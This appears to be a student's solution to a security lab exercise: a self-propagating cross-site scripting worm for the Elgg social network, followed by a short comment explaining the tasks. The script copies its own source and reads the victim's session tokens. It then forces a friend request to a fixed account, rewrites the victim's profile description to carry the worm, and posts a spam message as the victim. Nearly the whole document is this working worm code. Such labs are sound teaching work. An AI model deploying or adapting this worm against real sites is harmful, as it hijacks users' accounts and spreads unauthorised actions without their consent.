<script id="worm">
	var headerTag = "<script id=\"worm\" type=\"text/javascript\">";
	var jsCode = document.getElementById("worm").innerHTML;
	var tailTag = "</" + "script>";
	var wormCode = encodeURIComponent(headerTag + jsCode + tailTag);


	window.onload = function () {
	var Ajax=null;
	var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
	var token="&__elgg_token="+elgg.security.token.__elgg_token;
	//Construct the HTTP request to add Samy as a friend.

	var sendurl= "/action/friends/add?friend=47"+ts+token+ts+token; //FILL IN
	var sendurl2="/action/profile/edit"; //FILL IN
	var username = "&name="+elgg.session.user.name;
	var uid = "&guid="+elgg.session.user.guid;
	var isSamy = elgg.session.user.guid;
        var sendurl3="/action/thewire/add"; //FILL IN
	var wirebody = "&body="+ encodeURIComponent("To earn 12 USD/Hour(!), visit now\n") + encodeURIComponent("http://www.xsslabelgg.com/profile/samy");

	var content2=token+ts+username+"&description=%3Cp%3E"+wormCode+"%3C%2Fp%3E%0D%0A&accesslevel%5Bdescription%5D=1&briefdescription=1605049&accesslevel%5Bbriefdescription%5D=1&location=newelgg&accesslevel%5Blocation%5D=1&interests=ellgg&accesslevel%5Binterests%5D=1&skills=qw&accesslevel%5Bskills%5D=1&contactemail=a%40gmail.com&accesslevel%5Bcontactemail%5D=1&phone=ee&accesslevel%5Bphone%5D=1&mobile=efe&accesslevel%5Bmobile%5D=1&website=http%3A%2F%2Fwww.efef.com&accesslevel%5Bwebsite%5D=1&twitter=efef&accesslevel%5Btwitter%5D=1"+uid; //FILL IN

	var content3=token+ts+wirebody//FILL IN


	//Create and send Ajax request to add friend
	if(isSamy !== 47)
	{
		Ajax=new XMLHttpRequest();
		Ajax.open("GET",sendurl,true);
		//Ajax.setRequestHeader("Host","www.xsslabelgg.com");
		Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
		Ajax.send();

		Ajax2=new XMLHttpRequest();
		Ajax2.open("POST",sendurl2,true);
		//Ajax2.setRequestHeader("Host","www.xsslabelgg.com");
		Ajax2.setRequestHeader("Content-Type",
		"application/x-www-form-urlencoded");
		Ajax2.send(content2);

		Ajax3=new XMLHttpRequest();
		Ajax3.open("POST",sendurl3,true);
		//Ajax3.setRequestHeader("Host","www.xsslabelgg.com");
		Ajax3.setRequestHeader("Content-Type",
		"application/x-www-form-urlencoded");
		Ajax3.send(content3);
	}
	}
	//alert(jsCode);
</script>

/*
	I wrote the code for sending friend request just like task 1.
	Then, after opening a new ajax request for POST, I wrote the code for editing the victim's "about me(description)". Here, in the 		content variable, I edited the "description" field to store wormCode which is this js code itself. In this way, the victim's 		description gets changed to contain this code.
	Finally, I wrote the code for posting on behalf of the victim just like task 3. 
*/
